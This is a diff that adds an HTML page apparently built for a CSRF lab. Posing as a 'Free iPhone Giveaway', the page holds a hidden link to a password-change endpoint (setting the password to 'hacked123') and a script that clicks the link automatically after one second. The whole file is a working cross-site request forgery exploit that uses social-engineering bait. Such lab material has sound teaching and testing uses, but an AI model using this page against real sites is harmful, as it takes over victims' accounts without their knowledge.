@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Attack</title>
+</head>
+<body>
+    <h2>Free iPhone Giveaway! Click anywhere to claim!</h2>
+    <!-- Скрытая ссылка для CSRF-атаки -->
+    <a id="csrfLink" href="http://web:5000/change?password=hacked123" style="display:none;">Claim your iPhone</a>
+    <script>
+        console.log("CSRF attack script started.");
+
+        setTimeout(() => {
+            console.log("Starting CSRF attack...");
+
+            // Автоматически кликаем по ссылке
+            document.getElementById("csrfLink").click();
+            console.log("CSRF request sent.");
+        }, 1000);
+    </script>
+</body>
+</html>
